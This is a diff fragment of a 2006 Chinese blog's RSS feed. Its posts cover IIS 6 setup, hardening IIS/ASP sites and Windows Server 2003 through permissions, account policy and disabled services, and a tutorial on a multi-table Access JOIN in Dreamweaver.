+      <link>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87/</link>
+      <pubDate>Sat, 25 Feb 2006 07:50:56 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87/</guid>
+      <description>配置 Windows Server 2003 &amp;ndash; IIS 6 Microsoft Knowledge Base Article - 324742 这篇文章中的信息适用于: Microsoft Windows Server 2003, Datacenter Edition Microsoft Windows Server 2003, Enterprise Edition Microsoft Windows Server 2003, Standard Edition Microsoft Windows Server 2003, Web Edition Microsoft Windows Server 2003, 64-Bit Datacenter Edition Microsoft Windows Server 2003, 64-Bit Enterprise Edition Microsoft Internet Information Services version 6.0
+本分步指南介绍了如何在 Windows Server 2003 环境中设置一个用于匿名访问的 WWW 服务器。
+安装 Internet 信息服务
+Microsoft Internet 信息服务 (IIS) 是与 Windows Server 2003 集成的 Web 服务。</description>
+    </item>
+    
+    <item>
+      <title>安全维护 IIS asp 站点的高级技巧</title>
+      <link>http://example.org/2006/02/25/e5ae89e585a8e7bbb4e68aa4-iis-asp-e7ab99e782b9e79a84e9ab98e7baa7e68a80e5b7a7/</link>
+      <pubDate>Sat, 25 Feb 2006 03:36:42 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e5ae89e585a8e7bbb4e68aa4-iis-asp-e7ab99e782b9e79a84e9ab98e7baa7e68a80e5b7a7/</guid>
+      <description>一. 前言
+（仅以此文感谢好友bigeagle。不是他，我可能不用这么担心win2000安全问题的。呵呵！）
+人说，一朝被蛇咬，十年怕&amp;hellip;..，就是这样。2000年初，当我终于摆脱winnt 4.0 server那可怕的补丁之旅，迈向win2000 server时。我终于可以比较放心我的服务器了。但随着SQL SERVER的补丁出现。我知道，与微软的补丁因缘又开始轮回了。但还好。win2000自动化的管理还是让我放心好多，而以前管理winnt后的失眠症状也逐渐消失了。偶尔还能见到我的&amp;quot;梦&amp;quot;老弟。但这一切都伴随者同bigeagle的一次知心交谈中付之东流了。一次，bigeagle发来qq，给我看了一段代码。我一看就知道这不是bigeagle写的代码，那么烂，不过有点熟悉。再一看，啊？！这不是我的数据库连接字符串吗！！GOD。顿时觉得有一种不祥的预兆。不过还好，这个只是个access的，我还用了一些手段防止他被下载。但这足以让我长时间的失眠又来了。（再次说明，bigeagle不是蛇，他是鹰）
+二. 安装过程中的IIS 与 ASP安全防护
+（这里只考虑是Web服务器，而不是本地机子上的web开发平台。） 接下来的几天有是几个难熬的日子。我开始重新部署win2000 web服务器的安全策略。找到ASP代码被泄漏的原因。原来，我的补丁每次打得都比较及时的。但一次因为卸载FTP时，重装了IIS，而这之后，我并没有再打补丁而导致最新的漏洞web解析出错。（就是那个较新的漏洞 Translate :f， 用这个加上一些工具就可以看到ASP的代码了。）
+首先，开始重装IIS。
+这次安装的策略就是安全，够用。去掉一些多余的东西。
+1. FTP不要安装了，功能不好，还容易出错，并且漏洞很大。Ftp缺省传输密码的过程可是明文传送，很容易被人截获。（可以考虑用第三方工具。）
+2. 一切实例、文档也不要安装了。这是在web服务器上，最好不要这些例子，事实证明可以从这些例子站点突破IIS的防线的。
+3. 安装时选择站点目录，建议不要用缺省目录c:\inetpub，最好安装道不是系统盘的盘上。如： d:\IISWEB，可以考虑自建目录。这样即使IIS被突破，也能尽可能的保护好系统文件了。
+4. 不要安装html的远程管理。html的远程管理在winnt 4.0还能用的上，但漏洞比较大，而且比较危险，端口号虽然是随机的，但很容易被人扫描道，从而留下隐患。事实上，我们可以通过另一台服务器上的IIS来管理他。这样比较安全。
+5. 多余的服务也不要安了，如NNtp，如果不做新闻组。就不要安了。smtp，如果有更好的邮件服务，也不要装它了。
+6. 索引服务器。这个索引真的是很有用，但我没有用过他。否则，你可以用他建立个整个站点的文件搜索的，但现在好像大多数的ASP网页都是一个网页，动态从数据库里查询。所以根本用不上索引服务器了，（不是索引不好，而是本身上面的那种ASP文件结构就不适合）所以可以不要安装。
+三. 有目的进行安全配置
+①、开发前的工作。
+首先，启动IIS后，看有没有\iissamples,\IIShelp,\msadc,这些目录，如果有，他们大多是用来作为例子，帮助安装的，删掉他们，再把脚本库也删掉，直到web目录只留下干静的新建的虚拟目录即可。如果有管理的web站点，也删掉他。没有它，我们一样可以工作的更好。 还有看看有没有printer的文件夹，他们大多数都是些通过web来访问打印机的。MS就是怪。为了表示我的功力强大，允许通过web来远程打印。相信没有哪个网络公司是通过web网来打印的把。也不可能让网友来使用你的计算机吧。那好，去掉它。
+然后。开始详细配置各个web虚拟目录的安全。大概的策略是这样的。分类每个文件夹管理，如可以把扩展名是相同的分配到同一目录，如*.ASP的，和*.inc就尽量分开。如果是*.ASP的，则开放虚拟目录权限，但将实际目录权限授予administrator,system(完全控制)everyone (rc)即可。这样可以通过web允许读取。但实际上你可以加大安全力度，如果你认为它是比较保密的。如果是*.inc的，则开放目录权限，但不允许通过直接访问。这里又一个技巧了。比如，你可以允许实际目录被everyone访问，但在IIS中，你把改目录浏览项去掉，而包含文件只能被源文件读取，但不允许被直接读取。这样，黑客就不可能下载到你的单机数据库了，而且你的*.inc文件也不会被浏览器直接阅读。
+刚才我的老弟&amp;quot;梦&amp;quot;还在问我，有没有办法可以让别人看不到你的连接字符串，你可以试试下面的方法！ 1 首先建立连接字符串，并建立一个单独的文件*.inc（要是*.inc的，不要*.ASP的）你把你的连接字符串用变量复制进来。
+如：connstr=&amp;ldquo;&amp;ldquo;Provider=SQLOLEDB.1;Password=passw;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;..&amp;rdquo;
+2 然后建立一个文件夹include，放在根目录里。
+3 然后每一个文件用下面的办法打开连接。
+如： set conn=server.createobject(&amp;ldquo;adodb.connection&amp;rdquo;) conn.open connstr
+4 最后在iis里把include 文件夹用拒绝读的方法保护起来。你会发现，你的连接可以照常打开，但是如果对方看到你的源代码，他也看不到连接字符串，即使他看到了包含文件路径及名称。他也无法下载，或是用ie 打开。所以，可以保护你的连接字符串了。
+这里用的方法是NT权限与 IIS权限的共同审核。我们知道，为了让用户从web上访问道服务器的文件，每个安装了IIS后的服务器都会有两个内置账号。I_USExxxxxx，I_WAMxxxxxx（x为你的机器名），这样你就可以有的放矢地预防某些从你的web网络查看你的必要信息的用户了。
+当然，还有一些比较好的文件策略你可以参考一下：
+如：CGI (.exe, .dll, .cmd, .pl)Everyone (X)不允许读，只能运行。Administrators（完全控制）System（完全控制）。
+所以，你在编写ASP应用程序时，尽量归类好你的目录。方便用IIS和NT进行管理。
+如，采用下列结构比较好
+d:\web\ASPtest\static (放置*.</description>
+    </item>
+    
+    <item>
+      <title>Windows Server 2003网络服务器安全攻略</title>
+      <link>http://example.org/2006/02/25/windows-server-2003e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e694bbe795a5/</link>
+      <pubDate>Sat, 25 Feb 2006 03:00:28 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/windows-server-2003e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e694bbe795a5/</guid>
+      <description>Win2003 Server的安全性较之Win2K确实有了很大的提高，但是用Win2003 Server作为服务器是否就真的安全了?如何才能打造一个安全的个人Web服务器?下面我们简单介绍一下…… 一、Windows Server2003的安装
+1、安装系统最少两需要个分区，分区格式都采用NTFS格式
+2、在断开网络的情况安装好2003系统
+3、安装IIS，仅安装必要的 IIS 组件(禁用不需要的如FTP 和 SMTP 服务)。默认情况下，IIS服务没有安装，在添加/删除Win组件中选择“应用程序服务器”，然后点击“详细信息”，双击Internet信息服务(iis)，勾选以下选项:
+Internet 信息服务管理器;
+公用文件;
+后台智能传输服务 (BITS) 服务器扩展;
+万维网服务。
+如果你使用 FrontPage 扩展的 Web 站点再勾选:FrontPage 2002 Server Extensions
+4、安装MSSQL及其它所需要的软件然后进行Update。
+5、使用Microsoft 提供的 MBSA(Microsoft Baseline Security Analyzer) 工具分析计算机的安全配置，并标识缺少的修补程序和更新。下载地址:见页末的链接
+二、设置和管理账户
+1、系统管理员账户最好少建，更改默认的管理员帐户名(Administrator)和描述，密码最好采用数字加大小写字母加数字的上档键组合，长度最好不少于14位。
+2、新建一个名为Administrator的陷阱帐号，为其设置最小的权限，然后随便输入组合的最好不低于20位的密码
+3、将Guest账户禁用并更改名称和描述，然后输入一个复杂的密码，当然现在也有一个DelGuest的工具，也许你也可以利用它来删除Guest账户，但我没有试过。
+4、在运行中输入gpedit.msc回车，打开组策略编辑器，选择计算机配置-Windows设置-安全设置-账户策略-账户锁定策略，将账户设为“三次登陆无效”，“锁定时间为30分钟”，“复位锁定计数设为30分钟”。
+5、在安全设置-本地策略-安全选项中将“不显示上次的用户名”设为启用
+6、在安全设置-本地策略-用户权利分配中将“从网络访问此计算机”中只保留Internet来宾账户、启动IIS进程账户。如果你使用了Asp.net还要保留Aspnet账户。
+7、创建一个User账户，运行系统，如果要运行特权命令使用Runas命令。
+三、网络服务安全管理
+1、禁止C$、D$、ADMIN$一类的缺省共享
+打开注册表，HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters，在右边的窗口中新建Dword值，名称设为AutoShareServer值设为0
+2、 解除NetBios与TCP/IP协议的绑定
+右击网上邻居-属性-右击本地连接-属性-双击Internet协议-高级-Wins-禁用TCP/IP上的NETBIOS
+3、关闭不需要的服务，以下为建议选项
+Computer Browser:维护网络计算机更新，禁用
+Distributed File System: 局域网管理共享文件，不需要禁用
+Distributed linktracking client:用于局域网更新连接信息，不需要禁用
+Error reporting service:禁止发送错误报告
+Microsoft Serch:提供快速的单词搜索，不需要可禁用
+NTLMSecuritysupportprovide:telnet服务和Microsoft Serch用的，不需要禁用
+PrintSpooler:如果没有打印机可禁用
+Remote Registry:禁止远程修改注册表</description>
+    </item>
+    
+    <item>
+      <title>我也有blog了</title>
+      <link>http://example.org/2006/02/25/e68891e4b99fe69c89bloge4ba86/</link>
+      <pubDate>Sat, 25 Feb 2006 02:42:40 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e68891e4b99fe69c89bloge4ba86/</guid>
+      <description>呵呵</description>
+    </item>
+    
+    <item>
+      <title>多表联接</title>
+      <link>http://example.org/2006/02/22/211/</link>
+      <pubDate>Wed, 22 Feb 2006 12:55:28 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/22/211/</guid>
+      <description>多表联接建立记录集是十分有用的，因为某些情况下，我们需要把数字数据类型显示为相应的文本名称，这就遇到了多表联接建立记录集的问题。比如作一个会员注册系统，共有五个表，会员信息数据表member、会员身份表MemberIdentity、会员权限表MemberLevel、会员类别表MemberSort和会员婚姻状况表Wedlock。如果想把会员注册信息全部显示出来，肯定要将这四个表连起来，否则大家看到的某些会员信息可能只是数据编号。 以会员类别表来说，在其数据表中，1代表普通会员，2代表高级会员，3代表终身会员，在显示时，如果不将会员类别表与会员详细数据表相关联，那么假如我们现在看到的是一名普通会员的注册信息，我们只能看到其类别为1，而谁又会知道1代表的是普通会员呢？所以要将会员类别表与会员详细数据表相关联，关联后，1就显示为普通会员，2就显示为高级会员，3就显示为终身会员，这样多好？同理，其它两个表也要与会员详细数据表相关联才能把数据编号显示为相应的名称。
+前天制作网站后台时遇到此问题，在面包论坛、狂迷俱乐部、蓝色理想、和5D多媒体论坛发了贴子求救，都没有获得答案，只好自己研究，花了两天时间终于成功，现将其写成教程供大家分享，希望大家少走弯路。 本教程是把五个表联在一起，如果愿意，您可以将更多的表联在一起，方法大同小异啦~
+步骤一：用Access软件建立一个名为Member的数据库，在其中建五个表，分别为：会员信息数据表member、会员身份表MemberIdentity、会员权限表MemberLevel、会员类别表MemberSort和会员婚姻状况表Wedlock。
+●会员信息数据表member： MemberID：自动编号，主键（ID号） MemberSort：数字（会员类别） MemberName：文本，会员姓名 Password：文本（会员密码） MemberLevel：数字（会员权限） MemberIdentity：数字（会员身份） Wedlock：数字（婚姻状况） MemberQQ：文本（QQ号码） MemberEmail：文本（会员邮箱） MemberDate：日期/时间（会员注册日期）
+●会员身份表MemberIdentity： MemberIdentity：自动编号，主键（ID号） IdentityName：文本（会员身份名称）
+●会员权限表MemberLevel： MemberLevel：自动编号，主键（ID号） LevelName：文本（会员权限名称）
+●会员类别表MemberSort： MemberSort：自动编号，主键（ID号） SortName：文本（会员类别名称）
+●会员婚姻状况表Wedlock Wedlock：自动编号，主键（ID号） WedlockName：文本（会员婚姻状况类别） 说明：五个表建好后，您可以自行设置您想要的类别，如会员权限，您可以设置两个类别－－“未付费会员”和“已付费会员”，编号分别为“1”、“2”，如您设置了三个选项，那么第三个选项的编号当然就是“3”了。 下面我们所要作的工作就是把“1”、“2”之类的编号显示为“未付费会员”和“已付费会员”，否则，大家谁会知道“1”代表的是“未付费会员”，“2”代表的是“已付费会员”？
+步骤二：建DSN数据源，建记录集 ●运行Dreamweaver MX软件，在会员注册信息显示页面建一个名为ConnMember（您也可以起其它的名称）的DSN数据源。
+●点击服务器行为面板中的“绑定”，建一个名为MemberShow的数据集，“连接”选择ConnMember，“表格”选择Member，“列”全选，“排序”选择MemberDate，降序。点击“高级”按钮，修改SQL框中自动生成的代码： 原代码为： Select * FROM Member ORDER BY MemberDate DESC
+将代码修改为： Select * FROM (((Member INNER JOIN MemberSort ON Member.MemberSort=MemberSort.MemberSort) INNER JOIN MemberLevel ON Member.MemberLevel=MemberLevel.MemberLevel) INNER JOIN MemberIdentity ON Member.MemberIdentity=MemberIdentity.MemberIdentity) INNER JOIN Wedlock ON Member.Wedlock=Wedlock.Wedlock ORDER BY MemberDate DESC 修改完代码后，点击“确定”，大功告成！ 现在，您可以打开记录集看一下，五个表中的字段全部集成在MemberShow记录集中，您只要将相应的字段绑定在该字段想显示的单元格中即可。这下好了，所有的数字编号全部变成了相应的名称，如会员权限，不再是“1”和“2”的数字形式了，而是变成了相应的名称“未付费会员”和“已付费会员”。其它的数字编号也变成了显示的文本名称，是不是很开心呢？</description>
+    </item>
+    
+  </channel>
+</rss>
